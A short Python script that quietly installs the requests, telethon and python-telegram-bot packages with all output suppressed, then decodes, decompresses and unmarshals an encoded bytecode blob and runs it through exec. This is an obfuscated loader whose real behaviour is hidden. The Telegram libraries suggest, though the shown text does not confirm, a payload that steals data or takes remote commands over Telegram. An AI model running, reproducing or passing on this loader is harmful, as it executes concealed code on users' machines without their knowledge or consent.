import subprocess
import sys
import base64
import zlib
import marshal
import os
print("-1")
subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
subprocess.check_call([sys.executable, "-m", "pip", "install", "telethon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# DATA
DATA = "eJxlUs9rE1EQnrdvN7sJ7rZaaQOCsQpCrC39SarGYrRSiqGgiJqALGn2tabd7IbdTWNrAsGKePDgyXrssTX1Ll4k/0FDKwnbXgW9FXuwiAffS7O10Fl2Znbmm9l537w0HBO+ZfdzVK2ABhrSIYuSCDGf07kk17Q4iTX8CpI8BwTPBeCEVFp2Tj6ZozW8l6+gQ4tgkQvzP5kbRi6+bTpT6eM1Pvous8G+UHWPwulwqERHKSEHeaAibGCvYYlzOC+u8Ussgh3hCIk1odLKj0CJL3Jz4slBi6jIb/g83DKl4AUGeI9X8GtBgCYl9PHy9AgQgbfyJRgAGxU4BAkaY9HnOAEF9AkXUFicWuqLjEYG+4dHRgeGr8diE6r9aD5xd+jxw2ujDwrTkdRCLxl/khxMDcXzRiI2fl/HbC/xj7rAmBEcc54YS1KfTWw7YxouZ02HOVdMP0s5akZzJc1M57PEcMK8xeZyT7WAqpHKEpc3c8RwZZsYmnqEFFz/tOmozc4WI9rF9Pt/5UxGJy6asRl7F5j8kaK2Y2WM2TEGoq1aSKu9tSn7KVU/4KAMjfZb5cmGEixP7Abkd5PbgfPlO7sdodUrtY6r5fiuX36jfxjf9nev3m8op+tKqKaE1sTP3ZtKaEuJ1qXophT9jSFwcdPf3ZCiB57/1+6lf3h5OXYOrXXF2vBXFJN9VeCpW+X9NFqVEfPbhFhQrJ4VaSQsupJDdDJrpbKH1HCm7Yope9FIZ8zm6K4ySxyVLFBSVN00c+4ZK2+oecPJ6GrazOZ04pB12GfLttoYXopmTS2vkzEr2LwA9OT9VO1hhNB3CO6AfweUX7wP3dxrB9RVFuvQWYPOLQjWoacGPevxytQ3uGF10aJ/ZoPS/w=="
secure_data = DATA
payload = marshal.loads(zlib.decompress(base64.b64decode(secure_data)))
exec(payload)
